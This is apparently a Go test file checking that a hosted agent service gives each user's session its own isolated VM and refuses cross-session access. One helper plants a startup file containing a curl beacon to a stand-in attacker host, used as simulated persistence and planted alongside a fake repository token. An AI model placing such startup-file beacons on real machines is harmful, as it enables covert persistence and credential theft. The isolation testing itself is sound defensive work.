package services

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgtype"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/stretchr/testify/require"

	"github.com/smithersai/smithers/packages/backend/internal/db"
	pkgerrors "github.com/smithersai/smithers/packages/backend/internal/pkg/errors"
	"github.com/smithersai/smithers/packages/backend/productstore"
	workspaceapi "github.com/smithersai/smithers/packages/backend/workspace"
)

// ONE HOSTED AGENT BOX PER REPOSITORY AND BRANCH (plue#869). Every member's
// agent session joined the branch's one machine, owned by the payer account,
// and repository code ran there as one fixed non-root account. So turn B read
// turn A's worktree, home, /proc/<pid>/environ tokens and planted startup
// files. Each session now has its own box: a row keyed by agent_session_id,
// a guest of its own, and only its person and the machine service admitted.
//
// Composition is hosted's: a real product database, the workspace service
// over productstore.Product, every branch-machine provider admitting, and a
// runtime double that keeps each guest apart, so what one guest holds is
// what that box's row's turns left on it.

// sessionBoxGuest is one guest: its placement, its files and every
// environment a process in it was started with.
type sessionBoxGuest struct {
	vm       string
	state    workspaceapi.WorkspaceState
	files    map[string]string
	envs     []map[string]string
	started  []string
	receipt  []byte
	hasGit   bool
	hasJJ    bool
	services map[string]bool
}

// environment is every value any process in the guest was started with.
func (g *sessionBoxGuest) environment() []string {
	var values []string
	for _, env := range g.envs {
		for _, value := range env {
			values = append(values, value)
		}
	}
	return values
}

// credentials is every credential value a process in the guest holds: the
// head publisher's token and every token a run left in an environment.
func (g *sessionBoxGuest) credentials() []string {
	var values []string
	for _, env := range g.envs {
		for name, value := range env {
			if strings.HasSuffix(name, "_TOKEN") && value != "" {
				values = append(values, value)
			}
		}
	}
	return values
}

// sessionBoxRuntime places one guest per workspace row and keeps them apart.
type sessionBoxRuntime struct {
	workspaceapi.WorkspaceRuntime
	mu         sync.Mutex
	pool       *pgxpool.Pool
	guests     map[string]*sessionBoxGuest
	creates    int
	cloneURL   string
	repository int64
}

func newSessionBoxRuntime(pool *pgxpool.Pool, repository int64, cloneURL string) *sessionBoxRuntime {
	return &sessionBoxRuntime{pool: pool, guests: map[string]*sessionBoxGuest{}, repository: repository, cloneURL: cloneURL}
}

func (r *sessionBoxRuntime) guest(id string) *sessionBoxGuest {
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.guests[id]
}

// plant is what a run leaves in its guest: a startup file and a process
// holding the run's credential in its environment.
func (r *sessionBoxRuntime) plant(id, path, content string, env map[string]string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	g := r.guests[id]
	g.files[path] = content
	g.envs = append(g.envs, env)
}

func (*sessionBoxRuntime) Isolation() workspaceapi.IsolationLevel {
	return workspaceapi.IsolationSandboxed
}

func (*sessionBoxRuntime) Capabilities() workspaceapi.WorkspaceCapabilities {
	return workspaceapi.WorkspaceCapabilities{PersistentFiles: true, Execution: true, FileOperations: true, ManagedServices: true}
}

func (r *sessionBoxRuntime) CreateWorkspace(ctx context.Context, spec workspaceapi.WorkspaceSpec) (workspaceapi.Workspace, error) {
	r.mu.Lock()
	r.creates++
	vm := fmt.Sprintf("msb_box_%d", r.creates)
	r.guests[spec.ID] = &sessionBoxGuest{vm: vm, state: workspaceapi.WorkspaceRunning, files: map[string]string{}, services: map[string]bool{}}
	r.mu.Unlock()
	// As hosted's placement store does, the create publishes its placement.
	if _, err := r.pool.Exec(ctx, `UPDATE workspaces SET vm_id=$2 WHERE id=$1`, spec.ID, vm); err != nil {
		return workspaceapi.Workspace{}, err
	}
	return workspaceapi.Workspace{ID: spec.ID, State: workspaceapi.WorkspaceRunning, Home: "/home/developer", Root: "/workspace/repo"}, nil
}

func (r *sessionBoxRuntime) InspectWorkspace(_ context.Context, id string) (workspaceapi.Workspace, error) {
	g := r.guest(id)
	if g == nil {
		return workspaceapi.Workspace{}, workspaceapi.ErrWorkspaceNotFound
	}
	return workspaceapi.Workspace{ID: id, State: g.state, Home: "/home/developer", Root: "/workspace/repo"}, nil
}

func (r *sessionBoxRuntime) StartWorkspace(_ context.Context, id string) (workspaceapi.Workspace, error) {
	g := r.guest(id)
	if g == nil {
		return workspaceapi.Workspace{}, workspaceapi.ErrWorkspaceNotFound
	}
	r.mu.Lock()
	g.state = workspaceapi.WorkspaceRunning
	r.mu.Unlock()
	return workspaceapi.Workspace{ID: id, State: workspaceapi.WorkspaceRunning, Home: "/home/developer", Root: "/workspace/repo"}, nil
}

func (r *sessionBoxRuntime) ListFiles(_ context.Context, id, dir string) ([]workspaceapi.FileEntry, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	g := r.guests[id]
	if g == nil {
		return nil, workspaceapi.ErrWorkspaceNotFound
	}
	var entries []workspaceapi.FileEntry
	switch {
	case dir == ".git" && g.receipt != nil:
		entries = append(entries, workspaceapi.FileEntry{Name: "smithers-workspace-initialization.json"})
	case dir == "":
		if g.hasGit {
			entries = append(entries, workspaceapi.FileEntry{Name: ".git", IsDir: true})
		}
		if g.hasJJ {
			entries = append(entries, workspaceapi.FileEntry{Name: ".jj", IsDir: true})
		}
	}
	return entries, nil
}

func (r *sessionBoxRuntime) ReadFile(_ context.Context, id, _ string) ([]byte, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if g := r.guests[id]; g != nil {
		return g.receipt, nil
	}
	return nil, workspaceapi.ErrWorkspaceNotFound
}

func (r *sessionBoxRuntime) WriteRepositoryReceipt(_ context.Context, id string, content []byte) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.guests[id].receipt = append([]byte(nil), content...)
	return nil
}

// ExecuteCommand answers the commands a checkout is built and checked with,
// and the head publisher's probe once a join started one.
func (r *sessionBoxRuntime) ExecuteCommand(_ context.Context, id string, command workspaceapi.Command) (workspaceapi.CommandResult, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	g := r.guests[id]
	if g == nil {
		return workspaceapi.CommandResult{}, workspaceapi.ErrWorkspaceNotFound
	}
	if _, probe := command.Environment["SMITHERS_WORKSPACE_TOKEN_ID"]; probe {
		if !g.services[workspaceHeadReporterService] {
			return workspaceapi.CommandResult{ExitCode: 1}, nil
		}
		return workspaceapi.CommandResult{}, nil
	}
	head := strings.Repeat("a", 40)
	args := command.Args
	switch {
	case len(args) >= 3 && args[0] == "git" && args[1] == "remote":
		return workspaceapi.CommandResult{Stdout: r.cloneURL + "\n"}, nil
	case len(args) >= 2 && args[0] == "git" && args[1] == "ls-remote":
		return workspaceapi.CommandResult{Stdout: head + "\trefs/heads/main\n"}, nil
	case len(args) >= 2 && args[0] == "git" && args[1] == "clone":
		g.hasGit = true
	case len(args) >= 3 && args[0] == "jj" && args[1] == "git" && args[2] == "init":
		g.hasJJ = true
	case len(args) >= 2 && args[0] == "git" && args[1] == "rev-parse":
		return workspaceapi.CommandResult{Stdout: head + "\n"}, nil
	case len(args) >= 2 && args[0] == "git" && args[1] == "for-each-ref":
		return workspaceapi.CommandResult{Stdout: "refs/remotes/origin/main\n"}, nil
	}
	return workspaceapi.CommandResult{}, nil
}

func (r *sessionBoxRuntime) StartService(_ context.Context, id string, spec workspaceapi.ServiceSpec) (workspaceapi.Service, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	g := r.guests[id]
	if g == nil {
		return workspaceapi.Service{}, workspaceapi.ErrWorkspaceNotFound
	}
	g.started = append(g.started, spec.Name)
	g.services[spec.Name] = true
	g.envs = append(g.envs, spec.Command.Environment)
	return workspaceapi.Service{Name: spec.Name}, nil
}

func (*sessionBoxRuntime) InspectService(context.Context, string, string) (workspaceapi.ServiceObservation, error) {
	return workspaceapi.ServiceObservation{State: workspaceapi.ServiceRunning}, nil
}

func (r *sessionBoxRuntime) StopService(_ context.Context, id, name string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if g := r.guests[id]; g != nil {
		delete(g.services, name)
	}
	return nil
}

// sessionBoxes is the hosted composition with one repository and its writer.
type sessionBoxes struct {
	ctx      context.Context
	pool     *pgxpool.Pool
	q        *db.Queries
	boxes    *WorkspaceService
	runtime  *sessionBoxRuntime
	repo     int64
	owner    string
	name     string
	alice    int64
	machines int64
}

func newSessionBoxes(t *testing.T) *sessionBoxes {
	t.Helper()
	pool := newProductTestPool(t)
	q := db.New(pool)
	f := &sessionBoxes{ctx: context.Background(), pool: pool, q: q}
	f.alice, f.repo = setupTestUserAndRepo(t, pool)
	require.NoError(t, pool.QueryRow(f.ctx, `SELECT id FROM users WHERE lower_username='smithers-machines'`).Scan(&f.machines))
	slug, err := q.GetRepoOwnerSlugAndNameByID(f.ctx, f.repo)
	require.NoError(t, err)
	f.owner, f.name = slug.OwnerSlug, slug.RepoName
	f.runtime = newSessionBoxRuntime(pool, f.repo, testWorkspaceGitBaseURL+"/"+f.owner+"/"+f.name+".git")
	f.boxes = newWorkspaceServiceForTests(hostedProductStore{Product: productstore.New(pool)},
		WithWorkspaceRuntime(f.runtime), WithWorkspaceTransactions(pool), WithBranchMachineProviders(branchMachineTestProviders()))
	f.boxes.gitBaseURL = testWorkspaceGitBaseURL
	return f
}

// person is another account that may write the repository.
func (f *sessionBoxes) person(t *testing.T, name string) int64 {
	t.Helper()
	var id int64
	require.NoError(t, f.pool.QueryRow(f.ctx, `INSERT INTO users (username, lower_username, email, lower_email, is_active)
		VALUES ($1, $1, $2, $2, true) RETURNING id`, name, name+"@example.com").Scan(&id))
	_, err := f.pool.Exec(f.ctx, `INSERT INTO collaborators (repository_id, user_id, permission) VALUES ($1, $2, 'write')`, f.repo, id)
	require.NoError(t, err)
	return id
}

func (f *sessionBoxes) session(t *testing.T, person int64) string {
	t.Helper()
	var id string
	require.NoError(t, f.pool.QueryRow(f.ctx, `INSERT INTO agent_sessions (id, repository_id, user_id, status)
		VALUES (gen_random_uuid(), $1, $2, 'active') RETURNING id::text`, f.repo, person).Scan(&id))
	return id
}

// turn is one dispatched agent turn's join.
func (f *sessionBoxes) turn(person int64, session string) (AgentWorkspaceResult, error) {
	return f.boxes.CreateAgentWorkspace(f.ctx, CreateAgentWorkspaceInput{RepositoryID: f.repo, UserID: person,
		SessionID: session, RepoOwner: f.owner, RepoName: f.name})
}

func (f *sessionBoxes) box(t *testing.T, id string) db.Workspace {
	t.Helper()
	row, err := f.q.GetWorkspace(f.ctx, id)
	require.NoError(t, err)
	return row
}

// run is what a turn's run leaves on its box: a planted ~/.profile and a
// process holding a repository token minted for the run.
type sessionBoxRun struct {
	profile string
	tokens  []string
}

func (f *sessionBoxes) run(t *testing.T, person int64, result AgentWorkspaceResult) sessionBoxRun {
	t.Helper()
	token, err := issueTemporaryRepoTokenWithTTL(f.ctx, f.q, person, "agent-run-api", "write:repository", time.Hour)
	require.NoError(t, err)
	profile := "curl -s https://attacker.example/" + result.WorkspaceID
	f.runtime.plant(result.WorkspaceID, "/home/developer/.profile", profile, map[string]string{"SMITHERS_JJHUB_TOKEN": token.Plaintext})
	return sessionBoxRun{profile: profile, tokens: f.runtime.guest(result.WorkspaceID).credentials()}
}

// requireHoldsNothingOf asserts guest id holds none of run's credentials and
// none of its planted files.
func (f *sessionBoxes) requireHoldsNothingOf(t *testing.T, id string, run sessionBoxRun) {
	t.Helper()
	g := f.runtime.guest(id)
	require.NotNil(t, g)
	environment := g.environment()
	require.NotEmpty(t, run.tokens)
	for _, token := range run.tokens {
		require.NotContains(t, environment, token, "another person's turn holds none of this run's credentials")
	}
	for path, content := range g.files {
		require.NotEqual(t, run.profile, content, "another person's turn finds none of this run's files (%s)", path)
	}
}

// requireRefused asserts person may neither read nor write box: the access
// check, the branch-file read and the mutation door all refuse.
func (f *sessionBoxes) requireRefused(t *testing.T, person int64, box db.Workspace) {
	t.Helper()
	for _, level := range []WorkspaceAccessLevel{WorkspaceAccessRead, WorkspaceAccessWrite} {
		err := f.boxes.requireWorkspaceAccess(f.ctx, box.ID, box.UserID, person, level)
		var api *pkgerrors.APIError
		require.ErrorAs(t, err, &api, "%s access to another session's box", level)
		require.Equal(t, 403, api.Status, "%s access to another session's box", level)
	}
	_, err := f.boxes.ListBranchFiles(f.ctx, box.ID, f.repo, person, "")
	var api *pkgerrors.APIError
	require.ErrorAs(t, err, &api, "a branch-file read of another session's box")
	require.Equal(t, 403, api.Status)
	err = f.boxes.withWorkspaceMutationAuthority(f.ctx, box, person, func(context.Context) error {
		t.Fatal("another session's person must mutate nothing")
		return nil
	})
	require.Error(t, err)
}

func sessionBoxID(t *testing.T, pool *pgxpool.Pool, session string) string {
	t.Helper()
	var id string
	require.NoError(t, pool.QueryRow(t.Context(), `SELECT id::text FROM workspaces WHERE agent_session_id=$1 AND deleted_at IS NULL`, session).Scan(&id))
	return id
}

func TestAgentBoxTwoUsersSequential(t *testing.T) {
	f := newSessionBoxes(t)
	ben := f.person(t, "ben-box")
	aliceSession, benSession := f.session(t, f.alice), f.session(t, ben)

	a, err := f.turn(f.alice, aliceSession)
	require.NoError(t, err)
	aliceRun := f.run(t, f.alice, a)

	b, err := f.turn(ben, benSession)
	require.NoError(t, err)

	require.NotEqual(t, a.WorkspaceID, b.WorkspaceID, "two sessions, two boxes")
	require.NotEmpty(t, a.VMID)
	require.NotEmpty(t, b.VMID)
	require.NotEqual(t, a.VMID, b.VMID, "two boxes, two guests")
	require.Equal(t, 2, f.runtime.creates)
	f.requireHoldsNothingOf(t, b.WorkspaceID, aliceRun)
	f.requireRefused(t, ben, f.box(t, a.WorkspaceID))
	f.requireRefused(t, f.alice, f.box(t, b.WorkspaceID))

	for _, pair := range []struct{ session, box string }{{aliceSession, a.WorkspaceID}, {benSession, b.WorkspaceID}} {
		session, err := f.q.GetAgentSession(f.ctx, pair.session)
		require.NoError(t, err)
		require.Equal(t, pair.box, UUIDString(session.WorkspaceID), "each session reads its own box")
		require.Equal(t, pair.session, UUIDString(f.box(t, pair.box).AgentSessionID))
		require.Equal(t, f.machines, f.box(t, pair.box).UserID, "the machine service still owns every box")
		// Each box publishes its head to refs/smithers/branches/<its id>/head
		// with a token bound to that id, so a landing built from a turn's
		// head reads that box's own ref.
		var published []string
		for _, env := range f.runtime.guest(pair.box).envs {
			if id, ok := env["SMITHERS_WORKSPACE_ID"]; ok {
				published = append(published, id)
			}
		}
		require.Equal(t, []string{pair.box}, published, "the head publisher names its own box")
	}

	// The same session's next turn joins its own box again.
	again, err := f.turn(f.alice, aliceSession)
	require.NoError(t, err)
	require.Equal(t, a.WorkspaceID, again.WorkspaceID)
	require.Equal(t, 2, f.runtime.creates)
}

func TestAgentBoxTwoUsersConcurrent(t *testing.T) {
	f := newSessionBoxes(t)
	ben := f.person(t, "ben-box")
	people := []int64{f.alice, ben}
	sessions := []string{f.session(t, f.alice), f.session(t, ben)}

	results := make([]AgentWorkspaceResult, 2)
	errs := make([]error, 2)
	start := make(chan struct{})
	var wg sync.WaitGroup
	for i := range people {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			<-start
			results[i], errs[i] = f.turn(people[i], sessions[i])
		}(i)
	}
	close(start)
	wg.Wait()
	require.NoError(t, errs[0])
	require.NoError(t, errs[1])
	a, b := results[0], results[1]
	require.NotEqual(t, a.WorkspaceID, b.WorkspaceID, "two sessions, two boxes")
	require.NotEqual(t, a.VMID, b.VMID, "two boxes, two guests")
	require.Equal(t, 2, f.runtime.creates)

	aliceRun, benRun := f.run(t, f.alice, a), f.run(t, ben, b)
	f.requireHoldsNothingOf(t, b.WorkspaceID, aliceRun)
	f.requireHoldsNothingOf(t, a.WorkspaceID, benRun)
	f.requireRefused(t, ben, f.box(t, a.WorkspaceID))
	f.requireRefused(t, f.alice, f.box(t, b.WorkspaceID))
}

// A guest's chat turn on a member's repository (Security f-0engg8 condition
// 3) gets its own box too, and is refused on the member's.
func TestAgentBoxGuestTurnGetsOwnBox(t *testing.T) {
	f := newSessionBoxes(t)
	var guest int64
	require.NoError(t, f.pool.QueryRow(f.ctx, `INSERT INTO users (username, lower_username, email, lower_email, is_active)
		VALUES ('visiting-guest', 'visiting-guest', 'guest@example.com', 'guest@example.com', true) RETURNING id`).Scan(&guest))
	member, err := f.turn(f.alice, f.session(t, f.alice))
	require.NoError(t, err)
	memberRun := f.run(t, f.alice, member)

	visit, err := f.turn(guest, f.session(t, guest))
	require.NoError(t, err)

	require.NotEqual(t, member.WorkspaceID, visit.WorkspaceID, "the guest's turn has its own box")
	require.NotEqual(t, member.VMID, visit.VMID, "and its own guest")
	f.requireHoldsNothingOf(t, visit.WorkspaceID, memberRun)
	f.requireRefused(t, guest, f.box(t, member.WorkspaceID))
}

// A turn binds only its own session's box: no session attaches to another's.
func TestAgentBoxRefusesAnotherSessionsBinding(t *testing.T) {
	f := newSessionBoxes(t)
	ben := f.person(t, "ben-box")
	a, err := f.turn(f.alice, f.session(t, f.alice))
	require.NoError(t, err)
	for _, person := range []int64{f.alice, ben} {
		err = f.boxes.attachBranchMachineSession(f.ctx, a.WorkspaceID, CreateAgentWorkspaceInput{RepositoryID: f.repo, UserID: person, SessionID: f.session(t, person)})
		require.ErrorContains(t, err, "agent session binding denied")
	}
}

// The branch's own machine, the stack's lanes and a file restore never see a
// session's box on the same branch.
func TestBranchWorkspaceIgnoresSessionBoxes(t *testing.T) {
	f := newSessionBoxes(t)
	const branch = "feature/boxes"
	// A session's box exists on the branch before its machine does.
	session := f.session(t, f.alice)
	box, err := f.boxes.createWorkspaceRow(f.ctx, db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice,
		TargetBookmark: branch, Kind: "container", Status: "starting", AgentSessionID: pgUUIDFromString(session)})
	require.NoError(t, err)
	require.Equal(t, session, UUIDString(box.AgentSessionID))

	_, err = f.q.GetBranchWorkspace(f.ctx, db.GetBranchWorkspaceParams{RepositoryID: f.repo, TargetBookmark: branch})
	require.ErrorIs(t, err, pgx.ErrNoRows, "a session's box is not the branch's machine")

	machine, err := f.boxes.createWorkspaceRow(f.ctx, db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice,
		TargetBookmark: branch, Kind: "container", Status: "starting"})
	require.NoError(t, err)
	require.NotEqual(t, box.ID, machine.ID, "a join by branch creates the branch's machine")
	require.False(t, machine.AgentSessionID.Valid)
	joined, err := f.boxes.createWorkspaceRow(f.ctx, db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice,
		TargetBookmark: branch, Kind: "vm", Status: "starting"})
	require.NoError(t, err)
	require.Equal(t, machine.ID, joined.ID, "and every later join by branch takes it")
	found, err := f.q.GetBranchWorkspace(f.ctx, db.GetBranchWorkspaceParams{RepositoryID: f.repo, TargetBookmark: branch})
	require.NoError(t, err)
	require.Equal(t, machine.ID, found.ID)

	subject, _, err := InstallFileRestoreSubject(f.ctx, f.q, f.repo, branch, "README.md", strings.Repeat("b", 40), "absent", false)
	require.NoError(t, err)
	require.Equal(t, machine.ID, subject.WorkspaceID, "a file restore by branch names the branch's machine")

	// The stack's lane by its name, beside a session's box on the stack.
	stackSession := f.session(t, f.alice)
	stackBox, err := f.boxes.createWorkspaceRow(f.ctx, db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice, Name: "lane-1",
		TargetBookmark: MythicalBookmark, Kind: "container", Status: "starting", AgentSessionID: pgUUIDFromString(stackSession)})
	require.NoError(t, err)
	lane, err := f.boxes.createWorkspaceRow(withStackLaneCreation(f.ctx), db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice, Name: "lane-1",
		TargetBookmark: MythicalBookmark, Kind: "container", Status: "starting"})
	require.NoError(t, err)
	require.NotEqual(t, stackBox.ID, lane.ID, "a stack lane never takes a session's box")
	again, err := f.boxes.createWorkspaceRow(withStackLaneCreation(f.ctx), db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice, Name: "lane-1",
		TargetBookmark: MythicalBookmark, Kind: "container", Status: "starting"})
	require.NoError(t, err)
	require.Equal(t, lane.ID, again.ID)

	var count int
	require.NoError(t, f.pool.QueryRow(f.ctx, `SELECT count(*) FROM workspaces WHERE repository_id=$1 AND agent_session_id IS NOT NULL`, f.repo).Scan(&count))
	require.Equal(t, 2, count, "each session keeps exactly its own box")
}

// A dispatched agent turn names no workspace size and never joins the
// branch's machine, so a branch machine of another size cannot refuse it
// (#3877): the turn gets its own box at this deployment's size.
func TestAgentWorkspaceNeverJoinsTheSizedBranchMachine(t *testing.T) {
	f := newSessionBoxes(t)
	sized, err := f.boxes.createWorkspaceRow(f.ctx, db.CreateWorkspaceParams{RepositoryID: f.repo, UserID: f.alice,
		TargetBookmark: "main", Kind: "container", Status: "running",
		VcpuCount: pgtype.Int4{Int32: 1, Valid: true}, MemoryMb: pgtype.Int4{Int32: 4096, Valid: true}, DiskMb: pgtype.Int4{Int32: 32768, Valid: true}})
	require.NoError(t, err)
	_, err = f.pool.Exec(f.ctx, `UPDATE workspaces SET vm_id='vm-sized', started_at=NOW() WHERE id=$1`, sized.ID)
	require.NoError(t, err)

	joined, err := f.turn(f.alice, f.session(t, f.alice))
	require.NoError(t, err, "a dispatched turn names no size, so the branch machine's own size cannot refuse it")
	require.NotEqual(t, sized.ID, joined.WorkspaceID, "the turn has its own box")
	require.NotEqual(t, "vm-sized", joined.VMID)
	require.False(t, f.box(t, joined.WorkspaceID).VcpuCount.Valid, "the box takes this deployment's size")
}

// AgentBoxTurnsForTest exposes the session box composition to the external
// route test (agent_session_box_route_test.go): a repository, its writer,
// one of their agent sessions and that session's turns.
type AgentBoxTurnsForTest struct {
	Pool    *pgxpool.Pool
	Repo    int64
	Person  int64
	Session string
	f       *sessionBoxes
}

func NewAgentBoxTurnsForTest(t *testing.T) *AgentBoxTurnsForTest {
	t.Helper()
	f := newSessionBoxes(t)
	return &AgentBoxTurnsForTest{Pool: f.pool, Repo: f.repo, Person: f.alice, Session: f.session(t, f.alice), f: f}
}

// Turn joins the session's box for one dispatched turn and returns it.
func (a *AgentBoxTurnsForTest) Turn(t *testing.T) AgentWorkspaceResult {
	t.Helper()
	result, err := a.f.turn(a.Person, a.Session)
	require.NoError(t, err)
	return result
}
